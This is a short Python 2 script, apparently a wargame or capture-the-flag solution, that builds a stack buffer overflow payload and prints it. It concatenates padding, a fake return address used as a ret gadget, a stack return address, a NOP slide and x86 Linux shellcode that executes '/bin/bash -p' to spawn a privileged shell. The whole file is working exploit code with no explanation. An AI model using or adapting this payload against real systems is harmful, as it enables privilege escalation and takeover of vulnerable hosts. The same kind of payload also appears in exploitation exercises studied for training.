buffer = 'AAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS'

# 0x8048544
ret_addr_fake = '\x44\x85\x04\x08'

ret_addr = '\xa4\xfc\xff\xbf'

nop_slide = '\x90' * 128

shellcode = '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'


padding = buffer + ret_addr_fake + ret_addr + nop_slide + shellcode

print padding  